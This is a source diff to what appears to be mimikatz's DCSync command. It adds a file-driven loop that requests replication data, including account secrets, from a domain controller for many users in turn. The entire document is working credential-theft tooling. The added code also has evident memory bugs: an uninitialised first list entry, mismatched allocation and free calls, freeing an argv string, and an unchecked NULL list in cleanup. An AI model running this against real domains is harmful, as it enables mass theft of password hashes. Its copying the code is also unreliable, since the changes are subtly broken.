@@ -34,15 +34,16 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	RPC_BINDING_HANDLE hBinding;
 	DRS_HANDLE hDrs = NULL;
 	DSNAME dsName = {0};
-	DRS_MSG_GETCHGREQ getChReq = {0};
-	DWORD dwOutVersion = 0, i;
+	DWORD dwOutVersion = 0, i, strLen, userCount = 1, userFileSize = 0;
 	DRS_MSG_GETCHGREPLY getChRep;
 	ULONG drsStatus;
-	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
-	LPWSTR szTmpDc = NULL;
+	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService, szFile = NULL;
+	LPWSTR szTmpDc = NULL, szTmpUser, szCurUser = NULL, *szUserList = NULL;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
 	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL), withDeleted = kull_m_string_args_byName(argc, argv, L"deleted", NULL, NULL), decodeUAC = kull_m_string_args_byName(argc, argv, L"uac", NULL, NULL);
-	
+	PBYTE data = NULL;
+	LPSTR pch = NULL, szFileData, szNextToken, szToks = "\r\n";
+
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
 			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
@@ -57,98 +58,137 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 		if(szDc)
 		{
 			kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
-			if(allData || kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+			if(allData || kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"file", &szFile, NULL))
 			{
 				if(allData)
 					kprintf(L"[DC] Exporting domain \'%s\'\n", szDomain);
 				else if(szGuid)
 					kprintf(L"[DC] Object with GUID \'%s\'\n", szGuid);
-				else
-					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
+				else if (szFile) {
+					kprintf(L"[DC] Users will be retrieved from file \'%s\'\n", szFile);
+
+					if (kull_m_file_readData(szFile, &data, &userFileSize)) {
+
+						//Copy over to local buffer and add null byte to the end to avoid off by one read
+						szFileData = LocalAlloc(LPTR, userFileSize + 1);
+						RtlZeroMemory(szFileData, userFileSize + 1);
+						memcpy(szFileData, data, userFileSize);
+						LocalFree(data);
+
+						pch = strtok_s(szFileData, szToks, &szNextToken);
+						while (pch != NULL) {
+
+							szTmpUser = kull_m_string_qad_ansi_to_unicode(pch);
+							strLen = (DWORD)wcslen(szTmpUser);
+							if (strLen > 0) {
+								userCount += 1;
+								szUserList = realloc(szUserList, userCount * sizeof(LPWSTR));
+								szUserList[userCount - 1] = szTmpUser;
+							}
+							pch = strtok_s(NULL, szToks, &szNextToken);
+						}
+						LocalFree(szFileData);
+					}
+				}
+				else {
+					szUserList = malloc(1 * sizeof(wchar_t *));
+					szUserList[0] = (LPWSTR)szUser;
+				}
 
 				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
-				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
-				{
-					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
-					{
-						if(DrsExtensionsInt.dwReplEpoch)
-							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
-						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
-						{
-							getChReq.V8.pNC = &dsName;
-							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
-							getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
-							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
-							getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
+				for (DWORD k = 0; k < userCount; k++) {
 
-							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
+					//Reinitialize structure on each loop or we get a crash
+					DRS_MSG_GETCHGREQ getChReq = { 0 };
+
+					if (kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
+					{
+						
+						if (szUserList) {
+							szCurUser = szUserList[k];
+							kprintf(L"[DC] \'%s\' will be the user account\n", szCurUser);
+						}
+
+						if (kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szCurUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
+						{
+							if (DrsExtensionsInt.dwReplEpoch)
+								kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
+							if (kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
 							{
-								getChReq.V8.pPartialAttrSet->dwVersion = 1;
-								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
-								if(allData)
+								getChReq.V8.pNC = &dsName;
+								getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
+								getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
+								getChReq.V8.cMaxBytes = 0x00a00000; // 10M
+								getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
+
+								if (getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *)MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
 								{
-									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
-									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
-										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
-								}
-								else
-								{
-									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
-									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
-										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
-								}
-								RpcTryExcept
-								{
-									do
+									getChReq.V8.pPartialAttrSet->dwVersion = 1;
+									getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
+									if (allData)
 									{
-										RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
-										drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
-										if(drsStatus == 0)
+										getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
+										for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+											kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+									}
+									else
+									{
+										getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
+										for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+											kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+									}
+									RpcTryExcept
+									{
+										do
 										{
-											if(dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
+											RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
+											drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
+											if (drsStatus == 0)
 											{
-												if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
+												if (dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
 												{
-													REPLENTINFLIST* pObject = getChRep.V6.pObjects;
-													for(i = 0; i < getChRep.V6.cNumObjects; i++)
+													if (kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
 													{
-														if(csvOutput)
-															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, withDeleted, decodeUAC);
-														else
-															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
-														pObject = pObject->pNextEntInf;
+														REPLENTINFLIST* pObject = getChRep.V6.pObjects;
+														for (i = 0; i < getChRep.V6.cNumObjects; i++)
+														{
+															if (csvOutput)
+																kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, withDeleted, decodeUAC);
+															else
+																kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
+															pObject = pObject->pNextEntInf;
+														}
+													}
+													else
+													{
+														PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
+														break;
+													}
+													if (allData)
+													{
+														RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
+														RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
 													}
 												}
-												else
-												{
-													PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
-													break;
-												}
-												if(allData)
-												{
-													RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
-													RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
-												}
-											}
-											else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
-											kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
-											
-										}
-										else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
-									}
-									while(getChRep.V6.fMoreData);
-									IDL_DRSUnbind(&hDrs);
-								}
-								RpcExcept(RPC_EXCEPTION)
-									PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
-								RpcEndExcept
+												else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
+												kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
 
-								kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
-								MIDL_user_free(getChReq.V8.pPartialAttrSet);
+											}
+											else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
+										} while (getChRep.V6.fMoreData);
+										IDL_DRSUnbind(&hDrs);
+									}
+										RpcExcept(RPC_EXCEPTION)
+										PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+									RpcEndExcept
+
+										kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
+									MIDL_user_free(getChReq.V8.pPartialAttrSet);
+								}
 							}
 						}
+						kull_m_rpc_deleteBinding(&hBinding);
 					}
-					kull_m_rpc_deleteBinding(&hBinding);
 				}
 			}
 			else PRINT_ERROR(L"Missing user or guid argument\n");
@@ -161,6 +201,11 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 		LocalFree(szTmpDc);
 	if(pPolicyDnsDomainInfo)
 		LsaFreeMemory(pPolicyDnsDomainInfo);
+	for (DWORD j = 0; j < userCount; j++)
+		if (szUserList[j])
+			LocalFree(szUserList[j]);
+	if (szUserList)
+		LocalFree(szUserList);
 
 	return STATUS_SUCCESS;
 }
